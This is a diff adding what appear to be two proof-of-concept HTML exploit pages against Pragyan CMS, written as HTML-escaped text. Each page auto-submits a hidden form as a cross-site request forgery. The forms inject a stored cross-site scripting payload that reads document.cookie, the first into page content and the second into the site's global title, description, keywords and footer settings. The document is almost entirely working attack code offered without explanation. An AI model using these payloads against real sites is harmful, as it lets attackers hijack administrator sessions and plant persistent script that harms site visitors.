@@ -1,0 +1,20 @@
+&lt;form action=&quot;http://host/?page=/MY_PAGE_URL/&amp;action=edit&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;CKEditor1&quot; value=&#039;page content&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+&lt;form action=&quot;http://host/?page=/&amp;action=admin&amp;subaction=global&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cms_title&quot; value=&quot;Pragyan CMS&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cms_desc&quot; value=&#039;desc3&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cms_keywords&quot; value=&#039;Pragyan CMS&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cms_footer&quot; value=&#039;Powered by Praygan CMS&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cms_email&quot; value=&quot;email@example.com&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;default_template&quot; value=&quot;crystalx&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;update_global_settings&quot; value=&quot;&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
